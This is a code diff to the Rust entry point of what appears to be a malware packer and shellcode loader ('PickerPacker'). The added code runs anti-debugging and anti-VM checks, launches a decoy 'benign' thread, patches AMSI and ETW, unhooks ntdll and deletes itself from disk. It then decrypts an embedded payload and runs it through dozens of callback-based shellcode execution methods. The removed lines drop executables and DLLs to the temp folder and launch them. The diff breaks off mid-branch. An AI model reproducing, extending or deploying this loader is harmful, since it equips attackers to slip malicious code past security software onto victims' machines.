@@ -1,405 +1,332 @@
+// ============================================================================
+// Main Template - Loader Entry Point
+// ============================================================================
+
 use std::ffi::c_void;
+
+// Core modules
 mod execution;
+mod benign;
 
-#[cfg(any(feature = "TinyAES", feature = "CTAES"))]
-use std::env;
+// Conditional modules
+#[cfg(any(feature = "CheckAntiDebugProcessDebugFlags", feature = "CheckAntiDebugSystemDebugControl", feature = "CheckAntiDebugRemoteDebugger", feature = "CheckAntiDebugNtGlobalFlag", feature = "CheckAntiDebugProcessList", feature = "CheckAntiDebugHardwareBreakpoints", feature = "CheckAntiVMCPU", feature = "CheckAntiVMRAM", feature = "CheckAntiVMUSB", feature = "CheckAntiVMProcesses", feature = "CheckAntiVMHyperV", feature = "CheckAntiVMResolution", feature = "CheckAntiVMFan", feature = "CheckAntiVMComprehensive", feature = "CheckDomainJoined"))]
+mod checks;
 
+#[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple", feature = "EvasionNtdllUnhooking", feature = "EvasionAMSIHwbp", feature = "EvasionSelfDeletion", feature = "EvasionETWWinAPI", feature = "EvasionETWpEventWrite", feature = "EvasionETWpEventWrite2"))]
+mod evasion;
+
+// AES encryption support
 #[cfg(any(feature = "TinyAES", feature = "CTAES"))]
 mod aes;
 
-#[cfg(feature = "embedded")]
-const ENCPAYLOAD: &[u8] = &[];  // will be replaced with the (encrypted) payload data
-// will be replaced with one of: "SHELLCODE", "PE_EXE", "PE_DLL", "CSHARP_ASSEMBLY"
-const ENCTYPE: &str = "SHELLCODE";
+#[cfg(any(feature = "TinyAES", feature = "CTAES"))]
+mod crypto;
 
 #[cfg(any(feature = "TinyAES", feature = "CTAES"))]
-fn hex_to_bytes(hex_str: &str) -> Result<Vec<u8>, String> {
-    if !hex_str.len().is_multiple_of(2) {
-        return Err("Hex string must have even length".to_string());
-    }
-    
-    let mut bytes = Vec::new();
-    for i in (0..hex_str.len()).step_by(2) {
-        let byte_str = &hex_str[i..i+2];
-        match u8::from_str_radix(byte_str, 16) {
-            Ok(byte) => bytes.push(byte),
-            Err(_) => return Err(format!("Invalid hex characters: {}", byte_str)),
-        }
-    }
-    Ok(bytes)
-}
+mod args;
 
-/// Returns (key_bytes, iv_bytes) if valid, otherwise exits with error
-#[cfg(any(feature = "TinyAES", feature = "CTAES"))]
-fn parse_and_validate_aes_args() -> (Vec<u8>, Vec<u8>) {
-    let args: Vec<String> = env::args().collect();
-    let mut aes_key_str = String::new();
-    let mut aes_iv_str = String::new();
-    
-    // Parse command-line arguments
-    for i in 0..args.len() {
-        match args[i].as_str() {
-            "--key" if i < args.len() - 1 => aes_key_str = args[i + 1].clone(),
-            "--iv" if i < args.len() - 1 => aes_iv_str = args[i + 1].clone(),
-            _ => {}
-        }
-    }
-    
-    // Check if key and IV are provided
-    if aes_key_str.is_empty() || aes_iv_str.is_empty() {
-        eprintln!("[-] Error: AES decryption requires both --key and --iv arguments");
-        eprintln!("    Usage: PickerPacker.exe --key <64_hex_chars> --iv <32_hex_chars>");
-        std::process::exit(1);
-    }
-    
-    // Validate and convert key
-    let aes_key = match hex_to_bytes(&aes_key_str) {
-        Ok(bytes) if bytes.len() == 32 => bytes,
-        Ok(_) => {
-            std::process::exit(1);
-        }
-        Err(e) => {
-            std::process::exit(1);
-        }
-    };
-    
-    // Validate and convert IV
-    let aes_iv = match hex_to_bytes(&aes_iv_str) {
-        Ok(bytes) if bytes.len() == 16 => bytes,
-        Ok(_) => {
-            std::process::exit(1);
-        }
-        Err(e) => {
-            std::process::exit(1);
-        }
-    };
-    
-    (aes_key, aes_iv)
-}
+// Payload data (will be replaced by packer)
+const ENCPAYLOAD: &[u8] = &[];
 
-/// Decrypt payload using the appropriate AES method
-#[cfg(any(feature = "TinyAES", feature = "CTAES"))]
-fn decrypt_payload(encrypted: &[u8], key: &[u8], iv: &[u8]) -> Option<Vec<u8>> {
-    #[cfg(feature = "TinyAES")]
+/// Run all enabled evasion techniques
+#[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple", feature = "EvasionNtdllUnhooking", feature = "EvasionAMSIHwbp", feature = "EvasionSelfDeletion", feature = "EvasionETWWinAPI", feature = "EvasionETWpEventWrite", feature = "EvasionETWpEventWrite2"))]
+fn run_evasion_techniques() {
+    #[cfg(feature = "EvasionNtdllUnhooking")]
     {
-        return aes::aes_decrypt(encrypted, key, iv);
+        let _ = evasion::misc::unhook_ntdll();
     }
-    
-    #[cfg(feature = "CTAES")]
+
+    #[cfg(feature = "EvasionAMSISimplePatch")]
     {
-        return aes::ctaes_decrypt(encrypted, key, iv);
+        let _ = evasion::amsi::patch_amsi();
     }
+
+    #[cfg(feature = "EvasionAMSIHwbp")]
+    {
+        let _ = evasion::amsi::patch_amsi_hwbp();
+    }
+
+    #[cfg(feature = "EvasionETWSimple")]
+    {
+        let _ = evasion::etw::patch_etw();
+    }
+
+    #[cfg(feature = "EvasionETWWinAPI")]
+    {
+        let _ = evasion::etw::patch_etw_write_functions_start(evasion::etw::Patch::PatchEtwEventWrite);
+        let _ = evasion::etw::patch_etw_write_functions_start(evasion::etw::Patch::PatchEtwEventWriteFull);
+    }
+
+    #[cfg(feature = "EvasionETWpEventWrite")]
+    {
+        let _ = evasion::etw::patch_etwp_event_write_full_start();
+    }
+
+    #[cfg(feature = "EvasionETWpEventWrite2")]
+    {
+        let _ = evasion::etw::patch_etwp_event_write_full_call(evasion::etw::Patch2::PatchEtwEventWrite);
+        let _ = evasion::etw::patch_etwp_event_write_full_call(evasion::etw::Patch2::PatchEtwEventWriteFull);
+    }
+
+    #[cfg(feature = "EvasionSelfDeletion")]
+    {
+        let _ = evasion::misc::delete_self_from_disk();
+    }
+
 }
 
 fn main() {
-
-    /*
-    For the Operator -> Write some benign code that is to be executed (Optional)
-     */
-
-        // Validate AES arguments FIRST if AES encryption is enabled
-        #[cfg(all(feature = "embedded", any(feature = "TinyAES", feature = "CTAES")))]
-        let (aes_key, aes_iv) = parse_and_validate_aes_args();
-
-        //Benign Stuff
-        #[cfg(feature = "calculation")]
-        fn calculate()
-        {
-            let mut result = 0;
-            for i in 0..10000 {
-                result += i;
-            }
-            println!("Result: {}", result);
+    // =======================================================================
+    // Anti-debug checks
+    // =======================================================================
+    #[cfg(any(feature = "CheckAntiDebugProcessDebugFlags", feature = "CheckAntiDebugSystemDebugControl", feature = "CheckAntiDebugRemoteDebugger", feature = "CheckAntiDebugNtGlobalFlag", feature = "CheckAntiDebugProcessList", feature = "CheckAntiDebugHardwareBreakpoints", feature = "CheckAntiVMCPU", feature = "CheckAntiVMRAM", feature = "CheckAntiVMUSB", feature = "CheckAntiVMProcesses", feature = "CheckAntiVMHyperV", feature = "CheckAntiVMResolution", feature = "CheckAntiVMFan", feature = "CheckAntiVMComprehensive", feature = "CheckDomainJoined"))]
+    {
+        if checks::wrapper::run_all_checks() {
+            std::process::exit(1);
         }
-        #[cfg(feature = "calculation")]
-        calculate();
+    }
 
-        // Execute shellcode or payload without AES decryption
-        #[cfg(all(feature = "embedded", not(feature = "TinyAES"), not(feature = "CTAES")))]
-        {
-            let payload_bytes = ENCPAYLOAD.to_vec();
-            // Decide behavior based on ENCTYPE
-            if ENCTYPE == "SHELLCODE" {
-                let shellcode = payload_bytes.clone();
+    // =======================================================================
+    // Benign code execution (runs in separate thread)
+    // =======================================================================
+    benign::start_benign_thread();
 
-                #[cfg(feature = "ShellcodeExecuteDefault")]
-                execution::shellcode_execute_default(shellcode);
+    // =======================================================================
+    // Evasion techniques
+    // =======================================================================
+    #[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple", feature = "EvasionNtdllUnhooking", feature = "EvasionAMSIHwbp", feature = "EvasionSelfDeletion", feature = "EvasionETWWinAPI", feature = "EvasionETWpEventWrite", feature = "EvasionETWpEventWrite2"))]
+    run_evasion_techniques();
 
-                #[cfg(feature = "ShellcodeExecuteFiber")]
-                execution::shellcode_execute_fiber(shellcode);
+    // =======================================================================
+    // AES decryption setup
+    // =======================================================================
+    #[cfg(any(feature = "TinyAES", feature = "CTAES"))]
+    let (aes_key, aes_iv) = args::parse_and_validate_aes_args();
+        
+    // =======================================================================
+    // Execute shellcode without AES decryption
+    // =======================================================================
+    #[cfg(not(any(feature = "TinyAES", feature = "CTAES")))]
+    {
+        let shellcode = ENCPAYLOAD.to_vec();
 
-                #[cfg(feature = "ShellcodeExecuteCreateTimerQueueTimer")]
-                execution::shellcode_execute_createtimerqueuetimer(shellcode);
+        #[cfg(feature = "ShellcodeExecuteDefault")]
+        execution::shellcode_execute_default(shellcode.clone());
 
-                #[cfg(feature = "ShellcodeExecuteEnumUILanguages")]
-                execution::shellcode_execute_enumuilanguages(shellcode);
+        #[cfg(feature = "ShellcodeExecuteFiber")]
+        execution::shellcode_execute_fiber(shellcode.clone());
 
-                #[cfg(feature = "ShellcodeExecuteVerifierEnumerate")]
-                execution::shellcode_execute_verifierenumerate(shellcode);
+        #[cfg(feature = "ShellcodeExecuteCreateTimerQueueTimer")]
+        execution::shellcode_execute_createtimerqueuetimer(shellcode.clone());
 
-                #[cfg(feature = "ShellcodeExecuteEnumChildWindows")]
-                execution::shellcode_execute_enumchildwindows(shellcode);
+        #[cfg(feature = "ShellcodeExecuteEnumUILanguages")]
+        execution::shellcode_execute_enumuilanguages(shellcode.clone());
 
-                #[cfg(feature = "ShellcodeExecuteEnumDesktopWindows")]
-                execution::shellcode_execute_enumdesktopwindows(shellcode);
+        #[cfg(feature = "ShellcodeExecuteVerifierEnumerate")]
+        execution::shellcode_execute_verifierenumerate(shellcode.clone());
 
-                #[cfg(feature = "ShellcodeExecuteEnumSystemLocales")]
-                execution::shellcode_execute_enumsystemlocales(shellcode);
+        #[cfg(feature = "ShellcodeExecuteEnumChildWindows")]
+        execution::shellcode_execute_enumchildwindows(shellcode.clone());
 
-                #[cfg(feature = "ShellcodeExecuteCertEnumSystemStoreLocation")]
-                execution::shellcode_execute_certenumsystemstorelocation(shellcode);
+        #[cfg(feature = "ShellcodeExecuteEnumDesktopWindows")]
+        execution::shellcode_execute_enumdesktopwindows(shellcode.clone());
 
-                #[cfg(feature = "ShellcodeExecuteEnumWindowStations")]
-                execution::shellcode_execute_enumwindowstations(shellcode);
+        #[cfg(feature = "ShellcodeExecuteEnumSystemLocales")]
+        execution::shellcode_execute_enumsystemlocales(shellcode.clone());
 
-                #[cfg(feature = "ShellcodeExecuteEnumDisplayMonitors")]
-                execution::shellcode_execute_enumdisplaymonitors(shellcode);
+        #[cfg(feature = "ShellcodeExecuteCertEnumSystemStoreLocation")]
+        execution::shellcode_execute_certenumsystemstorelocation(shellcode.clone());
 
-                #[cfg(feature = "ShellcodeExecuteImageGetDigestStream")]
-                execution::shellcode_execute_imagegetdigeststream(shellcode);
+        #[cfg(feature = "ShellcodeExecuteEnumWindowStations")]
+        execution::shellcode_execute_enumwindowstations(shellcode.clone());
 
-                #[cfg(feature = "ShellcodeExecuteCertEnumSystemStore")]
-                execution::shellcode_execute_certenumsystemstore(shellcode);
+        #[cfg(feature = "ShellcodeExecuteEnumDisplayMonitors")]
+        execution::shellcode_execute_enumdisplaymonitors(shellcode.clone());
 
-                #[cfg(feature = "ShellcodeExecuteEnumTimeFormats")]
-                execution::shellcode_execute_enumtimeformats(shellcode);
+        #[cfg(feature = "ShellcodeExecuteImageGetDigestStream")]
+        execution::shellcode_execute_imagegetdigeststream(shellcode.clone());
 
-                #[cfg(feature = "ShellcodeExecuteCryptEnumOIDInfo")]
-                execution::shellcode_execute_cryptenumoidinfo(shellcode);
+        #[cfg(feature = "ShellcodeExecuteCertEnumSystemStore")]
+        execution::shellcode_execute_certenumsystemstore(shellcode.clone());
 
-                #[cfg(feature = "ShellcodeExecuteImmEnumInputContext")]
-                execution::shellcode_execute_immenuminputcontext(shellcode);
+        #[cfg(feature = "ShellcodeExecuteEnumTimeFormats")]
+        execution::shellcode_execute_enumtimeformats(shellcode.clone());
 
-                #[cfg(feature = "ShellcodeExecuteEnumPropsW")]
-                execution::shellcode_execute_enumpropsw(shellcode);
+        #[cfg(feature = "ShellcodeExecuteCryptEnumOIDInfo")]
+        execution::shellcode_execute_cryptenumoidinfo(shellcode.clone());
 
-                #[cfg(feature = "ShellcodeExecuteEnumLanguageGroupLocalesW")]
-                execution::shellcode_execute_enumlanguagegrouplocalesw(shellcode);
+        #[cfg(feature = "ShellcodeExecuteImmEnumInputContext")]
+        execution::shellcode_execute_immenuminputcontext(shellcode.clone());
 
-                #[cfg(feature = "ShellcodeExecuteSymEnumProcesses")]
-                execution::shellcode_execute_symenumprocesses(shellcode);
+        #[cfg(feature = "ShellcodeExecuteEnumPropsW")]
+        execution::shellcode_execute_enumpropsw(shellcode.clone());
 
-                #[cfg(feature = "ShellcodeExecuteCopyFileExW")]
-                execution::shellcode_execute_copyfileexw(shellcode);
+        #[cfg(feature = "ShellcodeExecuteEnumLanguageGroupLocalesW")]
+        execution::shellcode_execute_enumlanguagegrouplocalesw(shellcode.clone());
 
-                #[cfg(feature = "ShellcodeExecuteEnumObjects")]
-                execution::shellcode_execute_enumobjects(shellcode);
+        #[cfg(feature = "ShellcodeExecuteSymEnumProcesses")]
+        execution::shellcode_execute_symenumprocesses(shellcode.clone());
 
-                #[cfg(feature = "ShellcodeExecuteEnumResourceTypesW")]
-                execution::shellcode_execute_enumresourcetypesw(shellcode);
+        #[cfg(feature = "ShellcodeExecuteCopyFileExW")]
+        execution::shellcode_execute_copyfileexw(shellcode.clone());
 
-                #[cfg(feature = "ShellcodeExecuteEnumPageFilesW")]
-                execution::shellcode_execute_enumpagefilesw(shellcode);
+        #[cfg(feature = "ShellcodeExecuteEnumObjects")]
+        execution::shellcode_execute_enumobjects(shellcode.clone());
 
-                #[cfg(feature = "ShellcodeExecuteEnumDirTreeW")]
-                execution::shellcode_execute_enumdirtreew(shellcode);
+        #[cfg(feature = "ShellcodeExecuteEnumResourceTypesW")]
+        execution::shellcode_execute_enumresourcetypesw(shellcode.clone());
 
-                #[cfg(feature = "ShellcodeExecuteEnumFontFamiliesW")]
-                execution::shellcode_execute_enumfontfamiliesw(shellcode);
+        #[cfg(feature = "ShellcodeExecuteEnumPageFilesW")]
+        execution::shellcode_execute_enumpagefilesw(shellcode.clone());
 
-                #[cfg(feature = "ShellcodeExecuteEnumDesktopsW")]
-                execution::shellcode_execute_enumdesktopsw(shellcode);
+        #[cfg(feature = "ShellcodeExecuteEnumDirTreeW")]
+        execution::shellcode_execute_enumdirtreew(shellcode.clone());
 
-                #[cfg(feature = "ShellcodeExecuteInitOnceExecuteOnce")]
-                execution::shellcode_execute_initonceexecuteonce(shellcode);
+        #[cfg(feature = "ShellcodeExecuteEnumFontFamiliesW")]
+        execution::shellcode_execute_enumfontfamiliesw(shellcode.clone());
 
-                #[cfg(feature = "ShellcodeExecuteEnumThreadWindows")]
-                execution::shellcode_execute_enumthreadwindows(shellcode);
+        #[cfg(feature = "ShellcodeExecuteEnumDesktopsW")]
+        execution::shellcode_execute_enumdesktopsw(shellcode.clone());
 
-                #[cfg(feature = "ShellcodeExecuteEnumerateLoadedModulesW64")]
-                execution::shellcode_execute_enumerateloadedmodulesw64(shellcode);
+        #[cfg(feature = "ShellcodeExecuteInitOnceExecuteOnce")]
+        execution::shellcode_execute_initonceexecuteonce(shellcode.clone());
 
-                #[cfg(feature = "ShellcodeExecuteEnumFontsW")]
-                execution::shellcode_execute_enumfontsw(shellcode);
+        #[cfg(feature = "ShellcodeExecuteEnumThreadWindows")]
+        execution::shellcode_execute_enumthreadwindows(shellcode.clone());
 
-                #[cfg(feature = "ShellcodeExecuteEnumCalendarInfoW")]
-                execution::shellcode_execute_enumcalendarinfow(shellcode);
+        #[cfg(feature = "ShellcodeExecuteEnumerateLoadedModulesW64")]
+        execution::shellcode_execute_enumerateloadedmodulesw64(shellcode.clone());
 
-                #[cfg(feature = "ShellcodeExecuteEnumWindows")]
-                execution::shellcode_execute_enumwindows(shellcode);
+        #[cfg(feature = "ShellcodeExecuteEnumFontsW")]
+        execution::shellcode_execute_enumfontsw(shellcode.clone());
 
-                #[cfg(feature = "ShellcodeExecuteEnumPwrSchemes")]
-                execution::shellcode_execute_enumpwrschemes(shellcode);
+        #[cfg(feature = "ShellcodeExecuteEnumCalendarInfoW")]
+        execution::shellcode_execute_enumcalendarinfow(shellcode.clone());
 
-                #[cfg(feature = "ShellcodeExecuteSymFindFileInPath")]
-                execution::shellcode_execute_symfindfileinpath(shellcode);
+        #[cfg(feature = "ShellcodeExecuteEnumWindows")]
+        execution::shellcode_execute_enumwindows(shellcode.clone());
 
-                #[cfg(feature = "ShellcodeExecuteFlsAlloc")]
-                execution::shellcode_execute_flsalloc(shellcode);
-            } else if ENCTYPE == "PE_EXE" {
-                // Write payload to temp file and execute it
-                use std::fs::File;
-                use std::io::Write;
-                use std::env;
-                use std::process::Command;
+        #[cfg(feature = "ShellcodeExecuteEnumPwrSchemes")]
+        execution::shellcode_execute_enumpwrschemes(shellcode.clone());
 
-                let mut temp = env::temp_dir();
-                temp.push("picker_packed_payload.exe");
-                if let Ok(mut f) = File::create(&temp) {
-                    let _ = f.write_all(&payload_bytes);
-                    println!("[+] Wrote embedded EXE to: {:?}", temp);
-                    // attempt to launch
-                    let _ = Command::new(temp.as_os_str()).spawn();
-                } else {
-                    eprintln!("[-] Failed to write embedded EXE to disk");
-                }
-            } else if ENCTYPE == "PE_DLL" {
-                // Write DLL to temp and inform operator (auto-loading DLLs is environment-specific)
-                use std::fs::File;
-                use std::io::Write;
-                use std::env;
+        #[cfg(feature = "ShellcodeExecuteSymFindFileInPath")]
+        execution::shellcode_execute_symfindfileinpath(shellcode.clone());
 
-                let mut temp = env::temp_dir();
-                temp.push("picker_packed_payload.dll");
-                if let Ok(mut f) = File::create(&temp) {
-                    let _ = f.write_all(&payload_bytes);
-                    println!("[+] Wrote embedded DLL to: {:?} (manual load required)", temp);
-                } else {
-                    eprintln!("[-] Failed to write embedded DLL to disk");
-                }
-            } else if ENCTYPE == "CSHARP_ASSEMBLY" {
-                // Write C# assembly to temp and execute via inline execution
-                use std::fs::File;
-                use std::io::Write;
-                use std::env;
-                use std::process::Command;
+        #[cfg(feature = "ShellcodeExecuteFlsAlloc")]
+        execution::shellcode_execute_flsalloc(shellcode.clone());
+    }
 
-                let mut temp = env::temp_dir();
-                temp.push("picker_packed_assembly.exe");
-                if let Ok(mut f) = File::create(&temp) {
-                    let _ = f.write_all(&payload_bytes);
-                    println!("[+] Wrote embedded C# assembly to: {:?}", temp);
-                    // Execute via dotnet or direct execution
-                    let _ = Command::new(temp.as_os_str()).spawn();
-                } else {
-                    eprintln!("[-] Failed to write embedded C# assembly to disk");
-                }
-            } else {
-                eprintln!("[-] Unknown embedded payload type: {}", ENCTYPE);
-            }
+    // =======================================================================
+    // Execute shellcode with AES decryption
+    // =======================================================================
+    #[cfg(any(feature = "TinyAES", feature = "CTAES"))]
+    {
+        let encrypted_shellcode = ENCPAYLOAD;
+        if let Some(decrypted_shellcode) = crypto::decrypt_payload(encrypted_shellcode, &aes_key, &aes_iv) {
+            #[cfg(feature = "ShellcodeExecuteDefault")]
+            execution::shellcode_execute_default(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteFiber")]
+            execution::shellcode_execute_fiber(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteCreateTimerQueueTimer")]
+            execution::shellcode_execute_createtimerqueuetimer(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteEnumUILanguages")]
+            execution::shellcode_execute_enumuilanguages(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteVerifierEnumerate")]
+            execution::shellcode_execute_verifierenumerate(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteEnumChildWindows")]
+            execution::shellcode_execute_enumchildwindows(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteEnumDesktopWindows")]
+            execution::shellcode_execute_enumdesktopwindows(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteEnumSystemLocales")]
+            execution::shellcode_execute_enumsystemlocales(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteCertEnumSystemStoreLocation")]
+            execution::shellcode_execute_certenumsystemstorelocation(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteEnumWindowStations")]
+            execution::shellcode_execute_enumwindowstations(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteEnumDisplayMonitors")]
+            execution::shellcode_execute_enumdisplaymonitors(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteImageGetDigestStream")]
+            execution::shellcode_execute_imagegetdigeststream(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteCertEnumSystemStore")]
+            execution::shellcode_execute_certenumsystemstore(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteEnumTimeFormats")]
+            execution::shellcode_execute_enumtimeformats(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteCryptEnumOIDInfo")]
+            execution::shellcode_execute_cryptenumoidinfo(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteImmEnumInputContext")]
+            execution::shellcode_execute_immenuminputcontext(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteEnumPropsW")]
+            execution::shellcode_execute_enumpropsw(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteEnumLanguageGroupLocalesW")]
+            execution::shellcode_execute_enumlanguagegrouplocalesw(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteSymEnumProcesses")]
+            execution::shellcode_execute_symenumprocesses(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteCopyFileExW")]
+            execution::shellcode_execute_copyfileexw(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteEnumObjects")]
+            execution::shellcode_execute_enumobjects(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteEnumResourceTypesW")]
+            execution::shellcode_execute_enumresourcetypesw(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteEnumPageFilesW")]
+            execution::shellcode_execute_enumpagefilesw(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteEnumDirTreeW")]
+            execution::shellcode_execute_enumdirtreew(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteEnumFontFamiliesW")]
+            execution::shellcode_execute_enumfontfamiliesw(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteEnumDesktopsW")]
+            execution::shellcode_execute_enumdesktopsw(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteInitOnceExecuteOnce")]
+            execution::shellcode_execute_initonceexecuteonce(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteEnumThreadWindows")]
+            execution::shellcode_execute_enumthreadwindows(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteEnumerateLoadedModulesW64")]
+            execution::shellcode_execute_enumerateloadedmodulesw64(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteEnumFontsW")]
+            execution::shellcode_execute_enumfontsw(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteEnumCalendarInfoW")]
+            execution::shellcode_execute_enumcalendarinfow(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteEnumWindows")]
+            execution::shellcode_execute_enumwindows(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteEnumPwrSchemes")]
+            execution::shellcode_execute_enumpwrschemes(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteSymFindFileInPath")]
+            execution::shellcode_execute_symfindfileinpath(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteFlsAlloc")]
+            execution::shellcode_execute_flsalloc(decrypted_shellcode.clone());
         }
-
-        // Execute shellcode with AES decryption
-        #[cfg(all(feature = "embedded", any(feature = "TinyAES", feature = "CTAES")))]
-        {
-            let encrypted_shellcode = ENCPAYLOAD;
-            if let Some(decrypted_shellcode) = decrypt_payload(encrypted_shellcode, &aes_key, &aes_iv) {
-                // decide based on ENCTYPE; when decrypted, payload is in decrypted_shellcode
-                if ENCTYPE == "SHELLCODE" {
-                    #[cfg(feature = "ShellcodeExecuteDefault")]
-                    execution::shellcode_execute_default(decrypted_shellcode.clone());
-
-                    #[cfg(feature = "ShellcodeExecuteFiber")]
-                    execution::shellcode_execute_fiber(decrypted_shellcode.clone());
-
-                    #[cfg(feature = "ShellcodeExecuteCreateTimerQueueTimer")]
-                    execution::shellcode_execute_createtimerqueuetimer(decrypted_shellcode.clone());
-
-                    #[cfg(feature = "ShellcodeExecuteEnumUILanguages")]
-                    execution::shellcode_execute_enumuilanguages(decrypted_shellcode.clone());
-
-                    #[cfg(feature = "ShellcodeExecuteVerifierEnumerate")]
-                    execution::shellcode_execute_verifierenumerate(decrypted_shellcode.clone());
-
-                    #[cfg(feature = "ShellcodeExecuteEnumChildWindows")]
-                    execution::shellcode_execute_enumchildwindows(decrypted_shellcode.clone());
-
-                    #[cfg(feature = "ShellcodeExecuteEnumDesktopWindows")]
-                    execution::shellcode_execute_enumdesktopwindows(decrypted_shellcode.clone());
-
-                    #[cfg(feature = "ShellcodeExecuteEnumSystemLocales")]
-                    execution::shellcode_execute_enumsystemlocales(decrypted_shellcode.clone());
-
-                    #[cfg(feature = "ShellcodeExecuteCertEnumSystemStoreLocation")]
-                    execution::shellcode_execute_certenumsystemstorelocation(decrypted_shellcode.clone());
-
-                    #[cfg(feature = "ShellcodeExecuteEnumWindowStations")]
-                    execution::shellcode_execute_enumwindowstations(decrypted_shellcode.clone());
-
-                    #[cfg(feature = "ShellcodeExecuteEnumDisplayMonitors")]
-                    execution::shellcode_execute_enumdisplaymonitors(decrypted_shellcode.clone());
-
-                    #[cfg(feature = "ShellcodeExecuteImageGetDigestStream")]
-                    execution::shellcode_execute_imagegetdigeststream(decrypted_shellcode.clone());
-
-                    #[cfg(feature = "ShellcodeExecuteCertEnumSystemStore")]
-                    execution::shellcode_execute_certenumsystemstore(decrypted_shellcode.clone());
-
-                    #[cfg(feature = "ShellcodeExecuteEnumTimeFormats")]
-                    execution::shellcode_execute_enumtimeformats(decrypted_shellcode.clone());
-
-                    #[cfg(feature = "ShellcodeExecuteCryptEnumOIDInfo")]
-                    execution::shellcode_execute_cryptenumoidinfo(decrypted_shellcode.clone());
-
-                    #[cfg(feature = "ShellcodeExecuteImmEnumInputContext")]
-                    execution::shellcode_execute_immenuminputcontext(decrypted_shellcode.clone());
-
-                    #[cfg(feature = "ShellcodeExecuteEnumPropsW")]
-                    execution::shellcode_execute_enumpropsw(decrypted_shellcode.clone());
-
-                    #[cfg(feature = "ShellcodeExecuteEnumLanguageGroupLocalesW")]
-                    execution::shellcode_execute_enumlanguagegrouplocalesw(decrypted_shellcode.clone());
-
-                    #[cfg(feature = "ShellcodeExecuteSymEnumProcesses")]
-                    execution::shellcode_execute_symenumprocesses(decrypted_shellcode.clone());
-
-                    #[cfg(feature = "ShellcodeExecuteCopyFileExW")]
-                    execution::shellcode_execute_copyfileexw(decrypted_shellcode.clone());
-
-                    #[cfg(feature = "ShellcodeExecuteEnumObjects")]
-                    execution::shellcode_execute_enumobjects(decrypted_shellcode.clone());
-
-                    #[cfg(feature = "ShellcodeExecuteEnumResourceTypesW")]
-                    execution::shellcode_execute_enumresourcetypesw(decrypted_shellcode.clone());
-
-                    #[cfg(feature = "ShellcodeExecuteEnumPageFilesW")]
-                    execution::shellcode_execute_enumpagefilesw(decrypted_shellcode.clone());
-
-                    #[cfg(feature = "ShellcodeExecuteEnumDirTreeW")]
-                    execution::shellcode_execute_enumdirtreew(decrypted_shellcode.clone());
-
-                    #[cfg(feature = "ShellcodeExecuteEnumFontFamiliesW")]
-                    execution::shellcode_execute_enumfontfamiliesw(decrypted_shellcode.clone());
-
-                    #[cfg(feature = "ShellcodeExecuteEnumDesktopsW")]
-                    execution::shellcode_execute_enumdesktopsw(decrypted_shellcode.clone());
-
-                    #[cfg(feature = "ShellcodeExecuteInitOnceExecuteOnce")]
-                    execution::shellcode_execute_initonceexecuteonce(decrypted_shellcode.clone());
-
-                    #[cfg(feature = "ShellcodeExecuteEnumThreadWindows")]
-                    execution::shellcode_execute_enumthreadwindows(decrypted_shellcode.clone());
-
-                    #[cfg(feature = "ShellcodeExecuteEnumerateLoadedModulesW64")]
-                    execution::shellcode_execute_enumerateloadedmodulesw64(decrypted_shellcode.clone());
-
-                    #[cfg(feature = "ShellcodeExecuteEnumFontsW")]
-                    execution::shellcode_execute_enumfontsw(decrypted_shellcode.clone());
-
-                    #[cfg(feature = "ShellcodeExecuteEnumCalendarInfoW")]
-                    execution::shellcode_execute_enumcalendarinfow(decrypted_shellcode.clone());
-
-                    #[cfg(feature = "ShellcodeExecuteEnumWindows")]
-                    execution::shellcode_execute_enumwindows(decrypted_shellcode.clone());
-
-                    #[cfg(feature = "ShellcodeExecuteEnumPwrSchemes")]
-                    execution::shellcode_execute_enumpwrschemes(decrypted_shellcode.clone());
-
-                    #[cfg(feature = "ShellcodeExecuteSymFindFileInPath")]
-                    execution::shellcode_execute_symfindfileinpath(decrypted_shellcode.clone());
-
-                    #[cfg(feature = "ShellcodeExecuteFlsAlloc")]
-                    execution::shellcode_execute_flsalloc(decrypted_shellcode.clone());
-                    
-                } else if ENCTYPE == "PE_EXE" {
-                    // Do exe stuff
-                } else if ENCTYPE == "PE_DLL" {
